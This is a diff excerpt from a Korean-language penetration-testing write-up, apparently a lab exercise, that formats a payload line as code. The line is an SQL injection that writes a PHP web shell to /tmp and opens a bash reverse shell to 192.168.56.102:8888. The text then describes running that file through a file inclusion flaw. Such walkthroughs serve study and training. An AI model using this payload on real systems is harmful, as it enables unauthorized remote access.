@@ -49,7 +49,7 @@ md5로 decode해보니 password라는 값이 나옴. 따라서 admin의 비밀�
 
 ![image](https://github.com/user-attachments/assets/b4316c6f-7fa2-4fa0-8d4a-b2fbcbe377a2)
 
-' union select '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.56.102/8888 0>&1\'"); ?>', null into outfile '/tmp/shell.php'#
+`' union select '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.56.102/8888 0>&1\'"); ?>', null into outfile '/tmp/shell.php'#`
 
 로 /tmp 경로에 shell.php 파일을 생성한 후, file inclusion 에서 사용한 취약점을 이용하여 /tmp/shell.php 를 실행하여 리버스쉘 시도
 
